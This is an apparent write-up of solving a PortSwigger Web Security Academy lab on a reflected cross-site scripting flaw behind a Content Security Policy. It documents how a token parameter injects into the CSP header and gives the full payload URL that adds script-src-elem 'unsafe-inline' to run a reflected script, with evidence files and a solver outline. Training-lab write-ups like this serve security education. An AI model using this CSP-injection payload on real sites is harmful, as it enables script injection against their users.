# REPORT — Reflected XSS protected by CSP, with CSP bypass (Expert)

Instance: `0a1000fd031ddb3b82b08ee000e400c1.web-security-academy.net`
Session date: 2026-11-02
Outcome: **solved** — lab widget went from `is-notsolved` to `is-solved`.

## 1. Identification

The lab page title is `Reflected XSS protected by CSP, with CSP bypass`; the
Academy page labels it Expert and states the intended solution only works in
Chrome. No exploit server is attached (`GET /exploit` → 404), so the exploit is
just a crafted URL.

## 2. Surface mapping

| Request | Result |
|---|---|
| `GET /` | blog home, `<input name=search>` pointing at `GET /` |
| `GET /?search=test123` | `<h1>0 search results for 'test123'</h1>` — raw reflection |
| `GET /?token=ABC` | CSP header repeats the value: `report-uri /csp-report?token=ABC` |

Response header baseline (observed):

```
content-security-policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
```

Two findings:

* the `search` reflection is unencoded (`<script>` survives into the DOM), and
* the `token` parameter is concatenated into the CSP **header**, i.e. header /
  policy injection, not just a query echo.

## 3. Payload construction

Terminating the `report-uri` directive and adding a new one:

```
/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

`script-src-elem` is evaluated for `<script>` elements and takes precedence over
`script-src`, so `'unsafe-inline'` re-authorises the reflected inline script.

Verification that the policy changed (headers saved in
`evidence/03_exploit_response_headers.txt`):

```
content-security-policy: default-src 'self'; object-src 'none';script-src 'self';
  style-src 'self'; report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
```

and the body still carries the payload verbatim
(`evidence/03_exploit_response_body.html`, line with
`0 search results for '<script>alert(1)</script>'`).

## 4. Result

Before the exploit request the header widget was
`<div class='widgetcontainer-lab-status is-notsolved'>` with `<p>Not solved</p>`
(`evidence/01_lab_home_before_attack_not_solved.html`). After the request the
widget is `is-solved` / `<p>Solved</p>`
(`evidence/04_lab_home_after_attack_solved.html`).

This lab's solve detector runs **server-side** on the bypassing request: the
plain HTTP GET was enough, no browser or exploit server involvement. That makes
the lab solvable from a headless client.

## 5. Solver

`solve.py` (httpx only):

1. refuses to run unless the fetched title matches this lab;
2. records baseline widget state;
3. control request — asserts raw reflection and `script-src` without
   `unsafe-inline`;
4. exploit request — asserts the injected `script-src-elem 'unsafe-inline'`
   appears in the returned CSP;
5. polls `/` until `is-solved`;
6. prints status, request count and elapsed time; exit 0 only when solved.

Measured run (already-solved instance): **5 HTTP requests, 2.0 s**.

## 6. Evidence chain

| file | what it shows |
|---|---|
| `evidence/01_lab_home_before_attack_not_solved.html` | widget `is-notsolved` before any payload |
| `evidence/03_exploit_response_headers.txt` | CSP after injection (cookie redacted) |
| `evidence/03_exploit_response_body.html` | unencoded payload in the `<h1>` |
| `evidence/04_lab_home_after_attack_solved.html` | widget `is-solved`, `<p>Solved</p>` |

## 7. Limits of the verification

The provided instance was consumed by the recon request, so the shipped solver
could only re-verify it as "already solved". A fresh instance would require
launching a new lab from a logged-in PortSwigger account (login-gated); no
credentials are available in this environment, so that step was not performed.
The exploit mechanics themselves are proven by the before/after evidence and by
the solver's CSP-echo assertion on every run.
